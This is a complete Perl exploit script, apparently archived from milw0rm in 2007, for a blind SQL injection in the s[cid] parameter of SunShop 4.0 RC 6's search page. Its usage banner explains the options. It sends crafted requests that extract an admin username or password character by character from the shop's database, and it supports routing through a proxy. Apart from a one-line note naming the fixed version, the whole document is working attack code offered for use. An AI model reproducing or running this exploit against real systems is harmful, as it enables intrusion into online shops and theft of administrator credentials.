<html><head><title>SunShop 4.0 RC 6 (search) Remote Blind SQL Injection Exploit</title></head><pre>#!/usr/bin/perl
use LWP::UserAgent;
use Getopt::Long;

if(!$ARGV[1])
{
 print &quot;\n                         \\#'#/                      &quot;;
 print &quot;\n                         (-.-)                       &quot;;
 print &quot;\n   -----------------oOO---(_)---OOo------------------&quot;;
 print &quot;\n   | SunShop v4.0 RC 6 (search) Blind SQL Injection |&quot;;
 print &quot;\n   |      k1tk4t - Indonesia - newhack[dot]org      |&quot;;
 print &quot;\n   |      coded by DNX [dnx(at)hackermail.com]      |&quot;;
 print &quot;\n   --------------------------------------------------&quot;;
 print &quot;\n[!] Vendor: http://www.turnkeywebtools.com&quot;;
 print &quot;\n[!] Bug: in the search script, u can inject sql code in the s[cid] parameter&quot;;
 print &quot;\n[!] Solution: install v4.0.1&quot;;
 print &quot;\n[!] Usage: perl sunshop.pl [Host] [Path] &lt;Options&gt;&quot;;
 print &quot;\n[!] Example: perl sunshop.pl 127.0.0.1 /shop/ -i 1 -c 10 -o 1 -t ss_admins&quot;;
 print &quot;\n[!] Options:&quot;;
 print &quot;\n       -i [no]       Valid User-ID, default is 1&quot;;
 print &quot;\n       -c [no]       Valid Category-ID with products, default is 1&quot;;
 print &quot;\n       -o [no]       1 = get username (default)&quot;;
 print &quot;\n                     2 = get password&quot;;
 print &quot;\n       -t [name]     Changes the admin table name, default is admins&quot;;
 print &quot;\n       -p [ip:port]  Proxy support&quot;;
 print &quot;\n&quot;;
 exit;
}

my $host    = $ARGV[0];
my $path    = $ARGV[1];
my $user    = 1;
my $cat     = 1;
my $column  = &quot;username&quot;;
my $table   = &quot;admins&quot;;
my %options = ();
GetOptions(\%options, &quot;i=i&quot;, &quot;c=i&quot;, &quot;o=i&quot;, &quot;t=s&quot;, &quot;p=s&quot;);

print &quot;[!] Exploiting...\n&quot;;

if($options{&quot;i&quot;}) { $user = $options{&quot;i&quot;}; }
if($options{&quot;c&quot;}) { $cat = $options{&quot;c&quot;}; }
if($options{&quot;o&quot;} &amp;&amp; $options{&quot;o&quot;} == 2) { $column = &quot;password&quot;; }
if($options{&quot;t&quot;}) { $table = $options{&quot;t&quot;}; }

syswrite(STDOUT, &quot;data:&quot;, 5);

for(my $i = 1; $i &lt;= 32; $i++)
{
 my $found = 0;
 my $h = 48;
 while(!$found &amp;&amp; $h &lt;= 57)
 {
   if(istrue2($host, $path, $table, $user, $i, $h))
   {
     $found = 1;
     syswrite(STDOUT, chr($h), 1);
   }
   $h++;
 }
 if(!$found)
 {
   $h = 97;
   while(!$found &amp;&amp; $h &lt;= 122)
   {
     if(istrue2($host, $path, $table, $user, $i, $h))
     {
       $found = 1;
       syswrite(STDOUT, chr($h), 1);
     }
     $h++;
   }
 }
}

print &quot;\n[!] Exploit done\n&quot;;

sub istrue2
{
 my $host  = shift;
 my $path  = shift;
 my $table = shift;
 my $uid   = shift;
 my $i     = shift;
 my $h     = shift;

 my $ua = LWP::UserAgent-&gt;new;
 my $url = &quot;http://&quot;.$host.$path.&quot;index.php?l=search_list&amp;s[title]=Y&amp;s[short_desc]=Y&amp;s[full_desc]=Y&amp;s[cid]=&quot;.$cat.&quot;)%20AND%20SUBSTRING((SELECT%20&quot;.$column.&quot;%20FROM%20&quot;.$table.&quot;%20WHERE%20id=&quot;.$uid.&quot;),&quot;.$i.&quot;,1)=CHAR(&quot;.$h.&quot;)/*&quot;;

 if($options{&quot;p&quot;})
 {
   $ua-&gt;proxy('http', &quot;http://&quot;.$options{&quot;p&quot;});
 }

 my $response = $ua-&gt;get($url);
 my $content = $response-&gt;content;
 my $regexp = &quot;Add To Cart&quot;;

 if($content =~ /$regexp/)
 {
   return 1;
 }
 else
 {
   return 0;
 }
}
# milw0rm.com [2007-08-25]</pre></html>